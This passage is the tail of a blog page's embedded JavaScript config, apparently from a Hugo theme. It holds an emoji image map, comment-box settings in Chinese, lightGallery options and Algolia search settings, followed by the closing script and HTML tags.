h_rolling_eyes":"1f644.png","face_with_symbols_on_mouth":"1f92c.png","face_with_thermometer":"1f912.png","fearful":"1f628.png","flushed":"1f633.png","frowning":"1f626.png","ghost":"1f47b.png","gift_heart":"1f49d.png","green_heart":"1f49a.png","grimacing":"1f62c.png","grin":"1f601.png","grinning":"1f600.png","hankey":"1f4a9.png","hear_no_evil":"1f649.png","heart":"2764-fe0f.png","heart_decoration":"1f49f.png","heart_eyes":"1f60d.png","heart_eyes_cat":"1f63b.png","heartbeat":"1f493.png","heartpulse":"1f497.png","heavy_heart_exclamation_mark_ornament":"2763-fe0f.png","hole":"1f573-fe0f.png","hot_face":"1f975.png","hugging_face":"1f917.png","hushed":"1f62f.png","imp":"1f47f.png","innocent":"1f607.png","japanese_goblin":"1f47a.png","japanese_ogre":"1f479.png","joy":"1f602.png","joy_cat":"1f639.png","kiss":"1f48b.png","kissing":"1f617.png","kissing_cat":"1f63d.png","kissing_closed_eyes":"1f61a.png","kissing_heart":"1f618.png","kissing_smiling_eyes":"1f619.png","laughing":"1f606.png","left_speech_bubble":"1f5e8-fe0f.png","love_letter":"1f48c.png","lying_face":"1f925.png","mask":"1f637.png","money_mouth_face":"1f911.png","nauseated_face":"1f922.png","nerd_face":"1f913.png","neutral_face":"1f610.png","no_mouth":"1f636.png","open_mouth":"1f62e.png","orange_heart":"1f9e1.png","partying_face":"1f973.png","pensive":"1f614.png","persevere":"1f623.png","pleading_face":"1f97a.png","pouting_cat":"1f63e.png","purple_heart":"1f49c.png","rage":"1f621.png","relaxed":"263a-fe0f.png","relieved":"1f60c.png","revolving_hearts":"1f49e.png","right_anger_bubble":"1f5ef-fe0f.png","robot_face":"1f916.png","rolling_on_the_floor_laughing":"1f923.png","scream":"1f631.png","scream_cat":"1f640.png","see_no_evil":"1f648.png","shushing_face":"1f92b.png","skull":"1f480.png","skull_and_crossbones":"2620-fe0f.png","sleeping":"1f634.png","sleepy":"1f62a.png","slightly_frowning_face":"1f641.png","slightly_smiling_face":"1f642.png","smile":"1f604.png","smile_cat":"1f638.png","smiley":"1f603.png","smiley_cat":"1f63a.png","smiling_face_with_3_hearts":"1f970.png","smiling_imp":"1f608.png","smirk":"1f60f.png","smirk_cat":"1f63c.png","sneezing_face":"1f927.png","sob":"1f62d.png","space_invader":"1f47e.png","sparkling_heart":"1f496.png","speak_no_evil":"1f64a.png","speech_balloon":"1f4ac.png","star-struck":"1f929.png","stuck_out_tongue":"1f61b.png","stuck_out_tongue_closed_eyes":"1f61d.png","stuck_out_tongue_winking_eye":"1f61c.png","sunglasses":"1f60e.png","sweat":"1f613.png","sweat_drops":"1f4a6.png","sweat_smile":"1f605.png","thinking_face":"1f914.png","thought_balloon":"1f4ad.png","tired_face":"1f62b.png","triumph":"1f624.png","two_hearts":"1f495.png","unamused":"1f612.png","upside_down_face":"1f643.png","weary":"1f629.png","white_frowning_face":"2639-fe0f.png","white_heart":"1f90d.png","wink":"1f609.png","woozy_face":"1f974.png","worried":"1f61f.png","yawning_face":"1f971.png","yellow_heart":"1f49b.png","yum":"1f60b.png","zany_face":"1f92a.png","zipper_mouth_face":"1f910.png","zzz":"1f4a4.png"},"enableQQ":false,"highlight":true,"lang":"zh-cn","pageSize":10,"placeholder":"人世纷乱，出入平安。","recordIP":true,"visitor":true}},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"algoliaAppID":"PASDMWALPK","algoliaIndex":"index.zh-cn","algoliaSearchKey":"b42948e51daaa93df92381c8e2ac0f93","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
